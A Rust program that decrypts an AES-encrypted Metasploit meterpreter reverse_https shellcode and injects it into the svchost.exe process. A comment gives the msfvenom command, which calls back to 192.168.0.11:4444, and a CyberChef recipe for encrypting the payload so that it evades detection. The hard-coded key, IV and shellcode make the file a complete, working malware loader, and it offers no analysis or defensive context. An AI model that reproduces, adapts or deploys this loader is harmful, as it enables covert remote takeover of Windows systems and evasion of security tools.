use libaes::Cipher;
use process_injection::*;
use windows_sys::Win32::Foundation::CloseHandle;

fn main() {
    let key: [u8; 16] = [
        0x4f, 0x20, 0x08, 0xd7, 0x2f, 0x29, 0xb5, 0xec, 0x5c, 0xc3, 0xbf, 0xef, 0x6f, 0x99, 0xbb,
        0xbd,
    ];
    let iv: [u8; 16] = [
        0x00, 0xc9, 0x13, 0x92, 0xb6, 0x5d, 0xaa, 0xd1, 0xc9, 0xb9, 0x68, 0x2b, 0x0f, 0x7c, 0x58,
        0xd8,
    ];

    // generate payload with msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.11 LPORT=4444 -f rust
    // encrypt with https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'4f%2020%2008%20d7%202f%2029%20b5%20ec%205c%20c3%20bf%20ef%206f%2099%20bb%20bd'%7D,%7B'option':'Hex','string':'00%20c9%2013%2092%20b6%205d%20aa%20d1%20c9%20b9%2068%202b%200f%207c%2058%20d8'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Hex('0x%20with%20comma',0)
    let shellcode_encrypted: [u8; 512] = [
        0xeb, 0x68, 0x1e, 0xbc, 0xce, 0x0d, 0x20, 0xb6, 0x68, 0xec, 0x94, 0x00, 0x32, 0xad, 0xbb,
        0x47, 0x54, 0x2d, 0xc3, 0x19, 0x5e, 0xae, 0x95, 0x1d, 0x5a, 0x37, 0xa3, 0xd3, 0xfe, 0xbe,
        0xde, 0x16, 0x46, 0x6d, 0x52, 0x2b, 0x5c, 0x99, 0x81, 0x2f, 0x43, 0xf7, 0xb8, 0x9b, 0x59,
        0x2f, 0xf6, 0xbe, 0x04, 0x35, 0x16, 0x81, 0x4b, 0xe3, 0xb5, 0xc5, 0x66, 0xd1, 0x63, 0x62,
        0x0a, 0x04, 0x43, 0x0e, 0xe5, 0xe9, 0x4c, 0xbe, 0xef, 0x07, 0x84, 0x23, 0x40, 0x5c, 0x67,
        0x6b, 0x0a, 0x1e, 0x4f, 0xa9, 0xdb, 0xd3, 0x93, 0xf3, 0x3c, 0xe0, 0xa8, 0x8f, 0x85, 0xbd,
        0xf0, 0x9a, 0x6b, 0x7f, 0xb5, 0xd5, 0xd0, 0x83, 0x26, 0x60, 0x29, 0x00, 0x19, 0x17, 0xda,
        0x89, 0x1f, 0xa5, 0x19, 0x6a, 0x83, 0xd7, 0xdc, 0xbc, 0xe9, 0x0b, 0x45, 0xee, 0xfc, 0xf9,
        0x99, 0x62, 0x1f, 0x3d, 0xee, 0x79, 0xb2, 0xc7, 0xee, 0x58, 0x2d, 0xad, 0xac, 0x6c, 0xed,
        0xb1, 0x6b, 0x67, 0x66, 0xc6, 0xfa, 0x8e, 0xb0, 0x26, 0x17, 0xfe, 0xb2, 0x29, 0x2b, 0xcf,
        0x55, 0xe4, 0x9d, 0xab, 0x5a, 0xd6, 0x68, 0x1f, 0xd5, 0x47, 0x6c, 0xb3, 0xe8, 0xd8, 0xe2,
        0x07, 0x30, 0xd8, 0xcc, 0x39, 0x8f, 0xc2, 0x06, 0x0f, 0xc3, 0x2e, 0xba, 0xb3, 0xfd, 0x50,
        0x55, 0x4f, 0xda, 0xa5, 0x62, 0xce, 0x5d, 0xec, 0x7b, 0x49, 0x7a, 0xbf, 0x1b, 0x80, 0xec,
        0xfa, 0xb9, 0xa4, 0x38, 0xd2, 0x85, 0x21, 0x03, 0x60, 0x28, 0xdc, 0x2f, 0x60, 0x21, 0x30,
        0x59, 0x2b, 0xfa, 0xe6, 0x31, 0xdb, 0xb0, 0x78, 0x54, 0xaa, 0x45, 0x51, 0xae, 0x72, 0xa7,
        0x30, 0x6b, 0x16, 0x4d, 0xcf, 0xb9, 0xb0, 0x4d, 0x92, 0x62, 0x00, 0xf2, 0x2d, 0x33, 0x9e,
        0x55, 0x77, 0xd7, 0xd7, 0x0e, 0xa3, 0x5d, 0xe5, 0x37, 0xc1, 0x59, 0x34, 0xc8, 0x6c, 0x7b,
        0xa6, 0xc7, 0xd7, 0xa4, 0x2c, 0x5e, 0xd4, 0xef, 0xa7, 0xc8, 0x90, 0x10, 0x7f, 0xd5, 0xb7,
        0x5b, 0xe6, 0xbb, 0xe1, 0xde, 0x8d, 0xb1, 0x77, 0xfa, 0x71, 0x62, 0xc6, 0x05, 0xf2, 0x21,
        0x77, 0xe0, 0xc1, 0x50, 0x77, 0xa5, 0x4f, 0xf2, 0x28, 0xc6, 0x8b, 0x36, 0x2f, 0xa2, 0xa3,
        0xf4, 0x34, 0x76, 0xab, 0x65, 0x90, 0xcd, 0xae, 0x5b, 0x92, 0xda, 0x30, 0x3c, 0x1f, 0x46,
        0xbe, 0x2b, 0x9c, 0xd1, 0x70, 0x4f, 0xa3, 0x84, 0xe7, 0xb8, 0x83, 0x4f, 0xf8, 0x57, 0xf4,
        0xdb, 0x6a, 0x8b, 0x50, 0x90, 0xd6, 0x38, 0x17, 0x70, 0x39, 0x78, 0x2a, 0x92, 0x0c, 0x39,
        0x49, 0x1e, 0xf3, 0x14, 0xed, 0x00, 0xbc, 0x67, 0x1d, 0x67, 0x20, 0xcd, 0x75, 0x69, 0xf6,
        0x3a, 0x96, 0xa1, 0x60, 0x6e, 0x58, 0xec, 0x5e, 0xf7, 0x30, 0x9f, 0x97, 0x09, 0xea, 0x7f,
        0x0c, 0x7d, 0x22, 0x51, 0x83, 0xf4, 0x31, 0xab, 0x16, 0x2c, 0x43, 0xfb, 0xc9, 0x91, 0x7d,
        0xe0, 0x11, 0x00, 0xc5, 0x7d, 0x03, 0x2e, 0xd0, 0x1b, 0x1e, 0x6f, 0xec, 0xe1, 0x52, 0xe2,
        0x92, 0x11, 0x83, 0xa9, 0x95, 0x4e, 0x8d, 0xa2, 0x8c, 0x86, 0xad, 0xa7, 0xa7, 0xdf, 0xf2,
        0x29, 0x9e, 0xa9, 0x58, 0x4c, 0xf2, 0xbc, 0x35, 0xf0, 0x2a, 0x1e, 0x33, 0x94, 0x1f, 0x08,
        0xaf, 0x3b, 0xc1, 0x63, 0xad, 0x80, 0xce, 0x9a, 0xc9, 0x38, 0xf5, 0x51, 0x3c, 0xd8, 0xf0,
        0x27, 0x42, 0x9e, 0x1e, 0xf6, 0x92, 0x01, 0x7a, 0x96, 0x75, 0x90, 0x0e, 0xdd, 0xc8, 0x8c,
        0xbe, 0x73, 0x3c, 0x38, 0x3a, 0xaf, 0xdf, 0x83, 0x9e, 0x5d, 0x46, 0xe7, 0x89, 0xa8, 0x78,
        0x7b, 0xc7, 0x1e, 0x76, 0x67, 0xe1, 0x83, 0xac, 0xfe, 0x0e, 0x25, 0xdc, 0xc4, 0x9c, 0xb9,
        0xc3, 0x2b, 0xc1, 0x8c, 0x16, 0x73, 0x62, 0x37, 0xfd, 0x1d, 0x2e, 0xbf, 0x3d, 0x92, 0x49,
        0x6d, 0x3f,
        ];

    let cipher = Cipher::new_128(&key);
    let buf = cipher.cbc_decrypt(&iv, &shellcode_encrypted[..]);

    let process_name = "svchost.exe".to_string();
    match inject_shellcode(process_name, buf) {
        Ok(h) => println!("Process has been injected: {}", unsafe { CloseHandle(h) }),
        Err(e) => println!("Error during injection: {:?}", e),
    }
}
